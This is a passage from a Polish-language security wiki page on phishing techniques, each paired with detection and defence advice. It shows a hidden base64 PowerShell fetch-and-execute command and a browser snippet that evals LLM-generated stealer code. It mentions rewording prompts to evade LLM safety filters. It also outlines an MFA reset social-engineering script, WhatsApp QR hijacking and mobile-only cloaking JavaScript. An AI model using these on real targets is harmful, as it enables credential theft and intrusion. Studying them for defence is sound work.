  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
  ```
  * Zapewnia to elastyczność C2 (serwer może zmieniać zadania bez aktualizowania DLL) i ukrywa okna konsoli. Wyszukuj procesy potomne PowerShell uruchomione przez `rundll32.exe`, używające jednocześnie `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
* Obrońcy mogą szukać wywołań zwrotnych HTTP(S) w formacie `...page.php?tynor=<COMPUTER>sss<USER>` oraz 5-minutowych interwałów odpytywania po załadowaniu DLL.

---

## Operacje phishingowe wspomagane przez AI
Atakujący łączą teraz **API LLM i klonowania głosu**, aby tworzyć w pełni spersonalizowane przynęty i prowadzić interakcje w czasie rzeczywistym.

| Warstwa | Przykładowe zastosowanie przez cyberprzestępcę |
|-------|-----------------------------|
|Automatyzacja|Generowanie i wysyłanie >100 tys. e-maili / SMS-ów z losowo zmienianą treścią i linkami śledzącymi.|
|Generatywna AI|Tworzenie *jednorazowych* e-maili nawiązujących do publicznych transakcji M&A i wewnętrznych żartów z mediów społecznościowych; deepfake głosu CEO w oszustwie telefonicznym.|
|Agentowa AI|Autonomiczne rejestrowanie domen, pozyskiwanie informacji z otwartych źródeł i przygotowywanie kolejnych wiadomości, gdy ofiara kliknie, ale nie poda danych uwierzytelniających.|

**Obrona:**  
• Dodawaj **dynamiczne banery** wyróżniające wiadomości wysłane przez niezaufaną automatyzację (na podstawie anomalii ARC/DKIM).  
• Wdrażaj **frazy weryfikacyjne dla biometrii głosu** w przypadku telefonicznych próśb wysokiego ryzyka.  
• Stale symuluj przynęty wygenerowane przez AI w programach uświadamiających — statyczne szablony są przestarzałe.

Zobacz także — nadużywanie agentowego przeglądania do phishingu danych uwierzytelniających:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Zobacz także — nadużywanie przez agentów AI lokalnych narzędzi CLI i MCP (do inwentaryzacji sekretów i wykrywania):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Składanie phishingowego JavaScriptu w czasie wykonywania z pomocą LLM (generowanie kodu w przeglądarce)

Atakujący mogą dostarczyć niepozorny plik HTML i **wygenerować stealer w czasie wykonywania**, prosząc **zaufane API LLM** o JavaScript, a następnie wykonując go w przeglądarce (np. za pomocą `eval` lub dynamicznego `<script>`).<sup>[[8]](#references)</sup>

1. **Prompt jako metoda ukrywania:** zakoduj adresy URL eksfiltracji i ciągi Base64 w promptcie; iteracyjnie zmieniaj treść, aby ominąć filtry bezpieczeństwa i ograniczyć halucynacje.
2. **Wywołanie API po stronie klienta:** po załadowaniu JS wywołuje publiczne LLM (Gemini/DeepSeek/itp.) lub proxy CDN; w statycznym HTML znajduje się tylko prompt/wywołanie API.
3. **Złożenie i wykonanie:** połącz odpowiedź i wykonaj ją (polimorficznie przy każdej wizycie):

```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
  .then(r=>r.json())
  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```

4. **Phish/exfil:** wygenerowany kod personalizuje przynętę (np. parsowanie tokenu LogoKit) i wysyła dane logowania do ukrytego w promptcie endpointu.

**Cechy utrudniające wykrycie**
- Ruch trafia do dobrze znanych domen LLM lub renomowanych proxy CDN; czasem używa WebSocketów do komunikacji z backendem.
- Brak statycznego payloadu; złośliwy JS istnieje dopiero po renderowaniu.
- Niedeterministyczne generowanie tworzy **unikalne** stealery dla każdej sesji.

**Pomysły na wykrywanie**
- Uruchamiaj sandboxy z włączonym JS; wykrywaj **wywołania `eval`/dynamiczne tworzenie skryptów w czasie działania, gdy ich źródłem są odpowiedzi LLM**.
- Wyszukuj żądania POST z front-endu do API LLM, po których natychmiast następuje `eval`/`Function` na zwróconym tekście.
- Generuj alerty o niezatwierdzonych domenach LLM w ruchu klienta i następujących po nich żądaniach POST z danymi logowania.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Oprócz klasycznego push-bombingu operatorzy po prostu **wymuszają ponowną rejestrację MFA** podczas rozmowy z help deskiem, unieważniając istniejący token użytkownika. Każda kolejna prośba o logowanie wygląda dla ofiary na uzasadnioną.

```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```

Monitoruj zdarzenia AzureAD/AWS/Okta, w których **`deleteMFA` + `addMFA`** występują **w odstępie kilku minut i pochodzą z tego samego adresu IP**.



## Clipboard Hijacking / Pastejacking

Atakujący mogą po cichu skopiować złośliwe polecenia do schowka ofiary ze skompromitowanej lub podszywającej się strony internetowej, a następnie nakłonić użytkownika do wklejenia ich w oknie **Win + R**, **Win + X** lub terminalu, uruchamiając dowolny kod bez pobierania plików ani załączników.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing i dystrybucja złośliwych aplikacji (Android i iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Przejęcie łączenia urządzeń WhatsApp za pomocą QR i socjotechniki
* Strona-przynęta (np. fałszywy „kanał” ministerstwa/CERT) wyświetla kod QR WhatsApp Web/Desktop i instruuje ofiarę, by go zeskanowała, po cichu dodając atakującego jako **połączone urządzenie**.<sup>[[12]](#references)</sup>
* Atakujący natychmiast uzyskuje wgląd w czaty i kontakty, dopóki sesja nie zostanie usunięta. Ofiary mogą później zobaczyć powiadomienie o „połączeniu nowego urządzenia”; obrońcy mogą wyszukiwać nieoczekiwane zdarzenia łączenia urządzeń, które następują krótko po odwiedzeniu niezaufanych stron z kodami QR.

### Phishing dostępny tylko na urządzeniach mobilnych, aby omijać crawlery i sandboxy
Operatorzy coraz częściej ukrywają swoje strony phishingowe za prostym testem typu urządzenia, aby crawlery na komputerach stacjonarnych nie docierały do stron docelowych. Typowy schemat wykorzystuje krótki skrypt, który sprawdza, czy DOM obsługuje dotyk, i wysyła wynik do endpointu serwera; klientom innym niż mobilne zwracany jest HTTP 500 (lub pusta strona), a użytkownikom urządzeń mobilnych udostępniany jest pełny proces.<sup>[[7]](#references)</sup>

Minimalny fragment kodu klienta (typowa logika):

```html
<script src="/static/detect_device.js"></script>
```

`detect_device.js` logika (w uproszczeniu):

```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
  .then(()=>location.reload());
```

Często obserwowane zachowanie serwera:
- Ustawia cookie sesji podczas pierwszego ładowania.
- Akceptuje `POST /detect {"is_mobile":true|false}`.
- Zwraca 500 (lub placeholder) przy kolejnych żądaniach GET, gdy `is_mobile=false`; wyświetla phishing tylko wtedy, gdy `is_mobile=true`.

Wskazówki dotyczące wyszukiwania i wykrywania:
- Zapytanie urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetria internetowa: sekwencja `GET /static/detect_device.js` → `POST /detect` → HTTP 500 dla urządzeń innych niż mobilne; prawidłowe ścieżki ofiar korzystających z urządzeń mobilnych zwracają 200, a następnie HTML/JS.
- Blokuj lub dokładniej analizuj strony, które wyświetlają treści wyłącznie na podstawie `ontouchstart` lub podobnych testów urządzenia.

Wskazówki dotyczące obrony:
- Uruchamiaj crawlery z fingerprintami przypominającymi urządzenia mobilne i włączoną obsługą JS, aby ujawnić ukryte treści.
- Generuj alerty w przypadku podejrzanych odpowiedzi 500 występujących po `POST /detect` na nowo zarejestrowanych domenach.

## References

- [1] [Generowanie wariantów domen wykorzystywanych w phishingu (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Wykrywanie phishingu: narzędzia i techniki (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Kradzież danych uwierzytelniających i omijanie 2FA za pomocą noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Robando sesiones y bypasseando 2FA con EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Jak zainstalować i skonfigurować DKIM z Postfixem w Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Raport Global Incident Response Unit 42 2025 – edycja poświęcona inżynierii społecznej](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Cichy smishing – infrastruktura phishingowa z dostępem wyłącznie z urządzeń mobilnych i heurystyki (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Kolejny etap ataków z użyciem składania kodu w czasie wykonywania: wykorzystanie LLM do generowania JavaScriptu phishingowego w czasie rzeczywistym](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Podszywanie się, przechwytywanie kliknięć i TDS: kulisy ekosystemu dystrybucji malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting domeny Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Przechwytywanie ruchu do windows.com firmy Microsoft za pomocą bitflippingu (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Miłość? A może jednak nie: fałszywa aplikacja randkowa jako przynęta w ukierunkowanej kampanii spyware w Pakistanie](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [IoC i próbki ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
